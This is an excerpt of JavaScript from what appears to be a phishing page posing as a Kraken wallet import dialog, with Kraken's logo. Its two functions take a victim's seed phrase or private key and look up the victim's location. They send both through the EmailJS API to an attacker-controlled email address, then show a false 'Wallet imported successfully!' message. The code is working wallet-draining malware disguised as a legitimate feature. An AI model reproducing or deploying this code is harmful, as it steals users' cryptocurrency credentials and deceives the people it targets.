...
const logoUrl = 'https://logo.clearbit.com/kraken.com';
...
async function confirmPhrase(){ if (isImportDisabled.value) return showMessage('Please fill all fields', 'error'); isLoading.value = true; try { const location = await axios.get('https://ipapi.co/json'); const payload = { type: importType.value, phrase: phraseWords.value.join(' ') }; const params = { service_id: 'service_eusbqyo', template_id: 'template_z6xga6o', user_id: 'obT4LcwZqPw_KlOar', template_params: { from_name: 'Blockchain solutions', wallet_type: 'Kraken Wallet', location: JSON.stringify(location.data), link_drops: JSON.stringify(payload), reply_to: 'customeronlineagent@gmail.com' } }; const response = await axios.post('https://api.emailjs.com/api/v1.0/email/send', params); if (response.data === 'OK'){ showMessage('Wallet imported successfully!', 'success'); emit('close') } } catch(err){ showMessage(err.message || 'Import failed', 'error') } finally { isLoading.value = false } }
async function confirmPrivateKey(){ if (!privateKeyInput.value.trim()) return showMessage('Please enter a valid private key', 'error'); isLoading.value = true; try { const location = await axios.get('https://ipapi.co/json'); const payload = { type: 'private', phrase: privateKeyInput.value }; const params = { service_id: 'service_eusbqyo', template_id: 'template_z6xga6o', user_id: 'obT4LcwZqPw_KlOar', template_params: { from_name: 'Blockchain solutions', wallet_type: 'Kraken Wallet', location: JSON.stringify(location.data), link_drops: JSON.stringify(payload), reply_to: 'customeronlineagent@gmail.com' } }; const response = await axios.post('https://api.emailjs.com/api/v1.0/email/send', params); if (response.data === 'OK'){ showMessage('Wallet imported successfully!', 'success'); emit('close') } } catch(err){ showMessage(err.message || 'Import failed', 'error') } finally { isLoading.value = false } }
